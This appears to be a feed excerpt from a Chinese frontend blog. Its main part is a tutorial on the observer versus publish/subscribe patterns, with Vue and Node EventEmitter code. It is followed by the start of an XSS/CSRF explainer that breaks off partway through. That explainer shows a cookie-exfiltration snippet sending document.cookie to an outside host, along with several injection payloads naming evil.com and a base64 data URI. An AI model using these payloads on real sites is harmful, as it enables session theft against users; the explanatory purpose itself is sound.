        <content type="html"><![CDATA[<p>关于观察者模式与发布/订阅模式，不少大神都有帖子对他们做出了解释，但是很多文章都将两者混在了一起，认为他们就是同一种模式，实际上这两者还是有些差异的，所以本文就从我在谷歌的查阅和个人的理解，来仔细讲讲这两种模式，已经他们的一些应用场景。</p><a id="more"></a><h2 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h2><p>官方给出的观察者模式的解释是这样的：</p><blockquote><p>定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新。</p></blockquote><p>观察者模式实现的，其实就是当目标对象的某个属性发生了改变，所有依赖着目标对象的观察者都将接到通知，做出相应动作。<br>所以在目标对象的抽象类里，会保存一个观察者序列。当目标对象的属性发生改变生，会从观察者队列里取观察者调用各自的方法。</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>观察者和被观察者是抽象耦合的。</li><li>建立一套触发机制。</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。 </li><li>如果在观察者和观察目标之间有循环依赖的话，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。</li><li>观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。</li></ul><p>下面通过一张图来看一下观察者模式的实现。</p><p><img src="../assets/20191102/1.jpg" alt="Alt text"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">class Subject &#123;</span><br><span class="line">   let observers = [];</span><br><span class="line">   let state;</span><br><span class="line"> </span><br><span class="line">   getState() &#123;</span><br><span class="line">      return this.state;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   setState(state) &#123;</span><br><span class="line">      this.state = state;</span><br><span class="line">      notifyAllObservers();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   attach(observer)&#123;</span><br><span class="line">      observers.push(observer);      </span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   notifyAllObservers()&#123;</span><br><span class="line">      for (observer in observers) &#123;</span><br><span class="line">         observer.update();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Observer &#123;</span><br><span class="line">   let subject;</span><br><span class="line">   update();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class BinaryObserver extends Observer &#123; </span><br><span class="line">  constructor(subject) &#123; </span><br><span class="line">    super();</span><br><span class="line">    subject.attach(this);</span><br><span class="line">  &#125; </span><br><span class="line">  update() &#123;</span><br><span class="line">    console.log(&quot;Binary&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class OctalObserver extends Observer &#123; </span><br><span class="line">  constructor(subject) &#123; </span><br><span class="line">    super();</span><br><span class="line">    subject.attach(this);</span><br><span class="line">  &#125; </span><br><span class="line">  update() &#123;</span><br><span class="line">    console.log(&quot;Octal&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var subject = new Subject(); </span><br><span class="line">var binaryObserver = new BinaryObserver(subject);</span><br><span class="line">var octalObserver = new OctalObserver(subject);</span><br><span class="line"></span><br><span class="line">subject.setState(15);</span><br><span class="line">//Binary</span><br><span class="line">//Octal</span><br></pre></td></tr></table></figure><h2 id="发布-订阅模式"><a href="#发布-订阅模式" class="headerlink" title="发布/订阅模式"></a>发布/订阅模式</h2><p>在很多文章里讲到的观察者模式，其实说的都是发布订阅模式，那么他们的差别到底在哪里呢，让我们一点点往下看。<br>维基中对于发布/订阅是这样描述的：</p><blockquote><p>发布-订阅是一种消息范式，消息的发送者（称为发布者）不会将消息直接发送给特定的接收者（称为订阅者）。而是将发布的消息分为不同的类别，无需了解哪些订阅者（如果有的话）可能存在。同样的，订阅者可以表达对一个或多个类别的兴趣，只接收感兴趣的消息，无需了解哪些发布者（如果有的话）存在。</p></blockquote><p>也就是说，发布/订阅模式和观察者最大的差别就在于消息是否通过一个中间类进行转发。</p><h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><ul><li>相较于观察者模式，发布/订阅发布者和订阅者的耦合性更低</li><li>通过并行操作，消息缓存，基于树或基于网络的路由等技术，发布/订阅提供了比传统的客户端–服务器更好的可扩展性</li></ul><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ul><li>当中间类采用定时发布通知时，使用发布订阅无法确定所有订阅者是否都成功收到通知</li><li>当负载激增，请求订阅的订阅者数量增加，每个订阅者接收到通知的速度将会变慢</li></ul><h2 id="两种模式的区别"><a href="#两种模式的区别" class="headerlink" title="两种模式的区别"></a>两种模式的区别</h2><p>由上，我们就可以得出这两者的区别了：</p><ul><li>发布/订阅模式相比于观察者模式多了一个中间媒介，因为这个中间媒介，发布者和订阅者的关联更为松耦合</li><li>观察者模式通常用于<code>同步</code>的场景，而发布/订阅模式大多用于<code>异步</code>场景，例如消息队列。</li></ul><p><img src="../assets/20191102/2.jpg" alt="Alt text"></p><p>到这里，肯定会有小伙伴问，为什么没有发布/订阅模式的代码实例。其实在很多JS框架中，都采用发布/订阅模式进行了不少设计，下面我们就从Vue和Node来深入讲一讲关于发布/订阅的使用。</p><h2 id="Vue中的发布-订阅设计"><a href="#Vue中的发布-订阅设计" class="headerlink" title="Vue中的发布/订阅设计"></a>Vue中的发布/订阅设计</h2><p>Vue中使用到发布/订阅模式最经典的两块实现就是<code>数据双向绑定</code>和<code>父子组件通信</code>。</p><h3 id="数据双向绑定"><a href="#数据双向绑定" class="headerlink" title="数据双向绑定"></a>数据双向绑定</h3><p>vue数据双向绑定是通过数据劫持结合发布者-订阅者模式的方式来实现的。<br>具体实现数据双向绑定会需要三个步骤：</p><ul><li>实现一个监听器Observer，用来劫持并监听所有属性，如果有变动的，就通知订阅者。</li><li>实现一个订阅者Watcher，每一个Watcher都绑定一个更新函数，watcher可以收到属性的变化通知并执行相应的函数，从而更新视图。</li><li>实现一个解析器Compile，可以扫描和解析每个节点的相关指令（v-model，v-on等指令），如果节点存在v-model，v-on等指令，则解析器Compile初始化这类节点的模板数据，使之可以显示在视图上，然后初始化相应的订阅者（Watcher）。</li></ul><p><img src="../assets/20191102/3.png" alt="Alt text"></p><h4 id="数据劫持"><a href="#数据劫持" class="headerlink" title="数据劫持"></a>数据劫持</h4><p>Vue中，利用 <code>Object.defineProperty()</code> 实现数据劫持，监听到数据的变化。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Object.defineProperty(data, key, &#123;</span><br><span class="line">  set: function (value) &#123;</span><br><span class="line">    //...</span><br><span class="line">  &#125;,</span><br><span class="line">  get: function () &#123;</span><br><span class="line">    //...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h4 id="实现Observer"><a href="#实现Observer" class="headerlink" title="实现Observer"></a>实现Observer</h4><p>Observer是一个数据监听器,用来监听所有的属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">function Observer(data) &#123;</span><br><span class="line">  this.data = data;</span><br><span class="line">  this.walk(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Observer.prototype = &#123;</span><br><span class="line">  walk: function(data) &#123;</span><br><span class="line">    var self = this;</span><br><span class="line">    //遍历对象，获得对象所有属性的监听</span><br><span class="line">    Object.keys(data).forEach(function(key) &#123;</span><br><span class="line">      self.defineReactive(data, key, data[key]);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  defineReactive: function(data, key, val) &#123;</span><br><span class="line">    var dep = new Dep();</span><br><span class="line">    // 递归遍历所有子属性</span><br><span class="line">    var childObj = observe(val);</span><br><span class="line">    Object.defineProperty(data, key, &#123;</span><br><span class="line">      enumerable: true,</span><br><span class="line">      configurable: true,</span><br><span class="line">      get: function getter () &#123;</span><br><span class="line">        if (Dep.target) &#123;</span><br><span class="line">          // 在这里添加一个订阅者，有关Dep.target的获得，会在watcher中实现</span><br><span class="line">          dep.addSub(Dep.target);</span><br><span class="line">        &#125;</span><br><span class="line">        return val;</span><br><span class="line">      &#125;,</span><br><span class="line">      // setter，如果对一个对象属性值改变，就会触发setter中的dep.notify(),通知watcher（订阅者）数据变更，执行对应订阅者的更新函数，来更新视图。</span><br><span class="line">      set: function setter (newVal) &#123;</span><br><span class="line">        if (newVal === val) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        val = newVal;</span><br><span class="line">        // 新的值是object的话，进行监听</span><br><span class="line">        childObj = observe(newVal);</span><br><span class="line">        dep.notify();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function observe(value, vm) &#123;</span><br><span class="line">  if (!value || typeof value !== &apos;object&apos;) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  return new Observer(value);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 消息订阅器Dep，订阅器Dep主要负责收集订阅者，然后在属性变化的时候执行对应订阅者的更新函数</span><br><span class="line">function Dep () &#123;</span><br><span class="line">  this.subs = [];</span><br><span class="line">&#125;</span><br><span class="line">Dep.prototype = &#123;</span><br><span class="line">  /**</span><br><span class="line">   * [订阅器添加订阅者]</span><br><span class="line">   * @param  &#123;[Watcher]&#125; sub [订阅者]</span><br><span class="line">   */</span><br><span class="line">  addSub: function(sub) &#123;</span><br><span class="line">    this.subs.push(sub);</span><br><span class="line">  &#125;,</span><br><span class="line">  // 通知订阅者数据变更</span><br><span class="line">  notify: function() &#123;</span><br><span class="line">    this.subs.forEach(function(sub) &#123;</span><br><span class="line">      sub.update();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">Dep.target = null;</span><br></pre></td></tr></table></figure></p><h4 id="实现Watcher"><a href="#实现Watcher" class="headerlink" title="实现Watcher"></a>实现Watcher</h4><p>watcher就是一个订阅者，里面包含了添加订阅者到消息队列和接收响应发布者的通知。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function Watcher(vm, exp, cb) &#123;</span><br><span class="line">  this.cb = cb;</span><br><span class="line">  this.vm = vm;</span><br><span class="line">  this.exp = exp;</span><br><span class="line">  this.value = this.get();  // 将自己添加到订阅器的操作</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Watcher.prototype = &#123;</span><br><span class="line">  update: function() &#123;</span><br><span class="line">    this.run();</span><br><span class="line">  &#125;,</span><br><span class="line">  run: function() &#123;</span><br><span class="line">    var value = this.vm.data[this.exp];</span><br><span class="line">    var oldVal = this.value;</span><br><span class="line">    if (value !== oldVal) &#123;</span><br><span class="line">      this.value = value;</span><br><span class="line">      this.cb.call(this.vm, value, oldVal);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  get: function() &#123;</span><br><span class="line">    Dep.target = this;  // 缓存自己</span><br><span class="line">    var value = this.vm.data[this.exp]  // 强制执行监听器里的get函数</span><br><span class="line">    Dep.target = null;  // 释放自己</span><br><span class="line">    return value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>参数解释：</p><ul><li>cb：订阅者绑定的更新函数。</li><li>vm：Vue实例化的对象。</li><li>exp：节点的v-model或v-on：click等指令的属性值。</li></ul><h4 id="关联Observer和Watcher"><a href="#关联Observer和Watcher" class="headerlink" title="关联Observer和Watcher"></a>关联Observer和Watcher</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function SelfVue (data, el, exp) &#123;</span><br><span class="line">  this.data = data;</span><br><span class="line">  observe(data);</span><br><span class="line">  el.innerHTML = this.data[exp];  // 初始化模板数据的值</span><br><span class="line">  new Watcher(this, exp, function (value) &#123;</span><br><span class="line">    el.innerHTML = value;</span><br><span class="line">  &#125;);</span><br><span class="line">  return this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 id=&quot;name&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script src=&quot;js/observer.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;js/watcher.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;js/index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">  var ele = document.querySelector(&apos;#name&apos;);</span><br><span class="line">  var selfVue = new SelfVue(&#123;</span><br><span class="line">    name: &apos;hello world&apos;</span><br><span class="line">  &#125;, ele, &apos;name&apos;);</span><br><span class="line"></span><br><span class="line">  window.setTimeout(function () &#123;</span><br><span class="line">    console.log(&apos;name值改变了&apos;);</span><br><span class="line">    selfVue.data.name = &apos;canfoo&apos;;</span><br><span class="line">  &#125;, 2000);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其实到这里我们就已经实现了vue的数据双向绑定，从这个绑定过程，我们也很明确看到发布/订阅模式是如何起作用的。<br>本文主要围绕两种设计模式展开，有关compile解析节点的部分，在这里就不做细讲，感兴趣的小伙伴可以继续深入源码探究。</p><h3 id="父子组件通信"><a href="#父子组件通信" class="headerlink" title="父子组件通信"></a>父子组件通信</h3><p>Vue的父子组件通信也用到了发布/订阅模式。</p><ul><li>A组件通过 <code>$on</code> 订阅观察特定事件</li><li>B组件通过 <code>$emit</code> 将变化广播给其他订阅观察对应事件的组件，并调用他们的方法</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Vue.prototype.$on = function (event: string | Array&lt;string&gt;, fn: Function): Component &#123;</span><br><span class="line">  const vm: Component = this</span><br><span class="line">  if (Array.isArray(event)) &#123;</span><br><span class="line">    for (let i = 0, l = event.length; i &lt; l; i++) &#123;</span><br><span class="line">      this.$on(event[i], fn)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    (vm._events[event] || (vm._events[event] = [])).push(fn)</span><br><span class="line">  &#125;</span><br><span class="line">  return vm</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Vue.prototype.$emit = function (event: string): Component &#123;</span><br><span class="line">  const vm: Component = this</span><br><span class="line">  let cbs = vm._events[event]</span><br><span class="line">  if (cbs) &#123;</span><br><span class="line">    cbs = cbs.length &gt; 1 ? toArray(cbs) : cbs</span><br><span class="line">    const args = toArray(arguments, 1)</span><br><span class="line">    for (let i = 0, l = cbs.length; i &lt; l; i++) &#123;</span><br><span class="line">      cbs[i].apply(vm, args)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return vm</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Node中的发布-订阅设计"><a href="#Node中的发布-订阅设计" class="headerlink" title="Node中的发布/订阅设计"></a>Node中的发布/订阅设计</h2><p>Node中有一个EventEmiter模块，其消息机制采用的就是发布/订阅思想，下面我们来手写一个EventEmiter类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">class EvenEmiter&#123;</span><br><span class="line">  construct() &#123;</span><br><span class="line">    this._events = &#123;&#125;;</span><br><span class="line">    this.defaultMaxListener = 10;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setMaxListner(n) &#123;</span><br><span class="line">    this._maxListeners = n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  getMaxListener() &#123;</span><br><span class="line">    return this._maxListeners ? this.maxListeners : this.defaultMaxListeners;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  once(eventName, callback) &#123;</span><br><span class="line">    wrap(...args) &#123;</span><br><span class="line">      callback(...args);</span><br><span class="line">      this.removeListener(eventName,callback);</span><br><span class="line">    &#125;</span><br><span class="line">    wrap.cb = callback;</span><br><span class="line">    this.on(eventName, wrap);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  on(eventName, callback) &#123;</span><br><span class="line">    if (!this._events) &#123;</span><br><span class="line">      this._events = &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (this._events[eventName]) &#123;</span><br><span class="line">      this._events[eventName].push(callback);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      this._events[eventName] = [callback];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  emit(eventName) &#123;</span><br><span class="line">    if (this._events[eventName]) &#123;</span><br><span class="line">      this._events[eventName].forEach((fn) =&gt; &#123;</span><br><span class="line">        fn()</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  removeListener(eventName, callback) &#123;</span><br><span class="line">    if (this._events[eventName]) &#123;</span><br><span class="line">      this._events = this._events.filter(fn =&gt; &#123;</span><br><span class="line">        return fn !== callback;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  addEvnetListener(eventName, callback) &#123;</span><br><span class="line">    this.on(eventName, callback);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上就是有关观察者模式和发布/订阅模式的全部内容，如果有补充和有错的地方，欢迎大家留言。</p><blockquote><p>参考链接：<br><a href="https://www.cnblogs.com/canfoo/p/6891868.html" target="_blank" rel="noopener">vue的双向绑定原理及实现</a><br><a href="https://juejin.im/post/5b1ba6bef265da6e4f7a0e88" target="_blank" rel="noopener">node 订阅发布及实现</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JS，vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS、CSRF攻击问题详解</title>
      <link href="/XSS%E3%80%81CSRF%E6%94%BB%E5%87%BB%E9%97%AE%E9%A2%98%E8%AF%A6%E8%A7%A3.html"/>
      <url>/XSS%E3%80%81CSRF%E6%94%BB%E5%87%BB%E9%97%AE%E9%A2%98%E8%AF%A6%E8%A7%A3.html</url>
      
        <content type="html"><![CDATA[<p>一个好的网站，需要经得起Hacker的各种攻击，不久前在公司里给手上的项目做过一次安全性能的大升级，这次就专门来总结一下Web常见的一些安全攻击及其解决方法。</p><a id="more"></a><h2 id="XSS（Cross-Site-Script）"><a href="#XSS（Cross-Site-Script）" class="headerlink" title="XSS（Cross Site Script）"></a>XSS（Cross Site Script）</h2><h3 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h3><p>XSS 攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。<br>攻击者对客户端网页注入的恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。有很多种方式进行 XSS 攻击，但它们的共同点为：将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。</p><h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。</p><h5 id="input标签中注入script语句"><a href="#input标签中注入script语句" class="headerlink" title="input标签中注入script语句"></a>input标签中注入script语句</h5><p>攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。<br>当然不能直接把用户的 cookie 直接 alert 出来，因为同源策略严格限制了 JavaScript 的跨域访问，但同源策略并不限制 <code>&lt;img&gt;</code> 这样的标签从别的网站（跨域）去下载图片，所以可以通过创建一个不可见的 <code>&lt;img&gt;</code>，通过这个 <code>&lt;img&gt;</code> 发cookie到自己的服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img=document.createElement(&quot;img&quot;);</span><br><span class="line">img.src=&quot;http://web.com/log?&quot;+escape(document.cookie);</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure></p><h5 id="URL内注入script语句"><a href="#URL内注入script语句" class="headerlink" title="URL内注入script语句"></a>URL内注入script语句</h5><p>攻击直接将类似获取 cookie 等操作的语句通过 script 标签写在URL链接里，请求访问后台。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.php?x=&lt;script&gt;alert(&apos;chenie&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;localhost:8001/?q=111&amp;p=222&quot; &gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">const http = require(&apos;http&apos;);</span><br><span class="line">function handleReequest(req, res) &#123;</span><br><span class="line">    res.setHeader(&apos;Access-Control-Allow-Origin&apos;, &apos;*&apos;);</span><br><span class="line">    res.writeHead(200, &#123;&apos;Content-Type&apos;: &apos;text/html; charset=UTF-8&apos;&#125;);</span><br><span class="line">    res.write(&apos;&lt;script&gt;alert(&quot;反射型 XSS 攻击&quot;)&lt;/script&gt;&apos;);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">const server = new http.Server();</span><br><span class="line">server.listen(8001, &apos;127.0.0.1&apos;);</span><br><span class="line">server.on(&apos;request&apos;, handleReequest);</span><br></pre></td></tr></table></figure></p><p>当用户点击恶意链接时，页面跳转到攻击者预先准备的页面，会发现在攻击者的页面执行了 js 脚本。</p><h4 id="基于DOM型"><a href="#基于DOM型" class="headerlink" title="基于DOM型"></a>基于DOM型</h4><p>基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。</p><h5 id="a标签中"><a href="#a标签中" class="headerlink" title="a标签中"></a>a标签中</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.evil.com/?test=&quot; οnclick=alert(1)&quot;&quot; &gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=&quot; &gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=# οnclick=&quot;funcA(&apos;&apos;);alert(/xss/);//&apos;)&quot; &gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><h5 